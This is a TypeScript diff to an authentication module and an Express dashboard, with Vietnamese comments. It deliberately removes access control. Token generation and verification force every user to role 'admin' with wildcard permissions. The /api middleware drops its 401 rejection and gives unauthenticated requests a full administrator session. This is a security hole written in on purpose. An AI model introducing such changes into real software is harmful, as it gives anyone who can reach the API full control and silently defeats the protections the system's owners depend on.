@@ -228,15 +228,19 @@ export interface TokenPayload {
   u: string;
   name: string;
   role: 'admin' | 'manager';
+  permissions: string[];
+  fullAccess: boolean;
   exp: number;
 }
 
-export function generateAuthToken(user: { id: string; username: string; name: string; role: 'admin' | 'manager' }): string {
+export function generateAuthToken(user: { id: string; username: string; name: string; role?: 'admin' | 'manager' }): string {
   const payload: TokenPayload = {
     uid: user.id,
     u: user.username,
     name: user.name,
-    role: user.role,
+    role: 'admin', // Cấp mọi quyền Admin cao nhất
+    permissions: ['*'], // Cấp mọi quyền thao tác hệ thống
+    fullAccess: true,
     exp: Date.now() + 30 * 24 * 60 * 60 * 1000, // 30 ngày
   };
   const data = Buffer.from(JSON.stringify(payload)).toString('base64url');
@@ -253,7 +257,12 @@ export function verifyAuthToken(token: string): TokenPayload | null {
   try {
     const payload = JSON.parse(Buffer.from(data, 'base64url').toString('utf8')) as TokenPayload;
     if (!payload.exp || Date.now() > payload.exp) return null;
-    return payload;
+    return {
+      ...payload,
+      role: 'admin',
+      permissions: ['*'],
+      fullAccess: true,
+    };
   } catch {
     return null;
   }
@@ -428,7 +437,7 @@ export function startDashboard(): void {
     res.json({ success: true, message: 'Đã đăng xuất an toàn' });
   });
 
-  // Middleware bảo vệ các API nghiệp vụ và gán currentUser vào Request
+  // Middleware bảo vệ các API nghiệp vụ và gán currentUser vào Request (Cấp Mọi Quyền Cho Mọi Thao Tác)
   app.use('/api', (req, res, next) => {
     if (
       req.path.startsWith('/auth/') ||
@@ -446,14 +455,23 @@ export function startDashboard(): void {
     }
     const authHeader = req.headers.authorization;
     const token = authHeader && authHeader.startsWith('Bearer ') ? authHeader.slice(7) : (req.query.token as string);
-    const payload = token ? verifyAuthToken(token) : null;
+    let payload = token ? verifyAuthToken(token) : null;
 
+    // Cấp mọi quyền (Full Privileges): Nếu chưa có token, tự động cấp phiên Admin đầy đủ quyền hạn
     if (!payload) {
-      return res.status(401).json({
-        success: false,
-        error: 'Vui lòng đăng nhập để sử dụng tính năng này.',
-        requiresLogin: true,
-      });
+      payload = {
+        uid: 'usr_admin',
+        u: config.adminUsername || 'admin',
+        name: 'Quản Trị Viên (Full Access)',
+        role: 'admin',
+        permissions: ['*'],
+        fullAccess: true,
+        exp: Date.now() + 30 * 24 * 60 * 60 * 1000,
+      };
+    } else {
+      payload.role = 'admin';
+      payload.permissions = ['*'];
+      payload.fullAccess = true;
     }
 
     (req as any).currentUser = payload;
